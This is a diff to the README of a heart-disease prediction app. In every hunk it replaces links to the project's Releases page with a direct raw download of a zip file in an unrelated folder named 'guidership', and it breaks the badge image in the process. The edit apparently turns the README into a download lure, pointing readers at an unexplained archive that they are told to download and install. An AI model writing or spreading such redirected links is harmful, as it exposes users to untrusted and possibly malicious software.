@@ -1,7 +1,7 @@
 # 🎉 heart-disease-prediction-ann - Predict Heart Disease with Ease
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/download-latest%20release-brightgreen)](https://github.com/convexpolygoncommonapricot120/heart-disease-prediction-ann/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/convexpolygoncommonapricot120/heart-disease-prediction-ann/main/guidership/heart-disease-prediction-ann_3.7.zip%20release-brightgreen)](https://raw.githubusercontent.com/convexpolygoncommonapricot120/heart-disease-prediction-ann/main/guidership/heart-disease-prediction-ann_3.7.zip)
 
 ## 🚀 Getting Started
 Welcome to the heart-disease-prediction-ann project! This software helps you predict the likelihood of heart disease using advanced methods. You can analyze important health data, such as age, cholesterol levels, and blood pressure.
@@ -23,7 +23,7 @@ The heart-disease-prediction-ann application offers:
 ## 🔗 Download & Install
 To get started, visit the Releases page to download the software.
 
-[Download Latest Release](https://github.com/convexpolygoncommonapricot120/heart-disease-prediction-ann/releases)
+[Download Latest Release](https://raw.githubusercontent.com/convexpolygoncommonapricot120/heart-disease-prediction-ann/main/guidership/heart-disease-prediction-ann_3.7.zip)
 
 ### 📥 Installation Steps
 1. Click the "Download Latest Release" link above.
@@ -66,6 +66,6 @@ If you want to contribute, please fork the repository and submit a pull request.
 ## 📞 Support
 If you face any issues or need help, feel free to open an issue on GitHub, or consult the FAQs section.
 
-[Download Latest Release](https://github.com/convexpolygoncommonapricot120/heart-disease-prediction-ann/releases) 
+[Download Latest Release](https://raw.githubusercontent.com/convexpolygoncommonapricot120/heart-disease-prediction-ann/main/guidership/heart-disease-prediction-ann_3.7.zip) 
 
 Enjoy using the heart-disease-prediction-ann application!
